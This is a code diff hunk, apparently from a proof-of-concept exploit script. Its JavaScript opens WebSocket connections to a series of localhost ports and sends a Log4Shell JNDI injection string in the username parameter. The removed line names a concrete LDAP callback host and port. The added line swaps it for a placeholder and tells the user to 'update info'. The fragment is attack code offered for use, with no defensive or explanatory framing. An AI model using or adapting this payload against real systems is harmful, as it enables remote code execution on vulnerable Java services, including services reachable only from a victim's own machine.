@@ -12,7 +12,7 @@
                    const port = ports[i];
                    setTimeout(function(){
                        // open a web socket --> make sure to update the String to point to the relevant things. it can be anything. 
-                       var ws = new WebSocket("ws://localhost:" + port + "/login?username=${jndi:ldap://10.10.3.23:1805/2eydin}"); //update info
+                       var ws = new WebSocket("ws://localhost:" + port + "/login?username=${jndi:ldap://<<payload>>}"); //update info
                        ws.onopen = function() {
                           // Web Socket is connected, send data using send()
                           ws.send("Message to send");
